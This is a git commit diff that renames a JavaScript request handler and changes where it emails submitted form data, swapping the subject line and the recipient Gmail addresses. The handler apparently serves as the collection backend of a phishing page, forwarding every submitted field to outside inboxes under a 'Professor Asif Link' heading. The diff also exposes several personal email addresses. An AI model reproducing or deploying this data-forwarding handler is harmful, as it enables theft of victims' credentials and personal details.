85db3121402d24e214698c419f29020059dae1d4
zm9807350 <zm9807350@gmail.com>
2025-11-29 17:22:08 +0500

    Update and rename jahangir.js to Kalo.js

--- Kalo.js
+++ Kalo.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com",
-      subject: "Jahangir",
+      to: "linkquarry@gmail.com,fahadali9911ggg@gmail.com",
+      subject: "Kalo",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
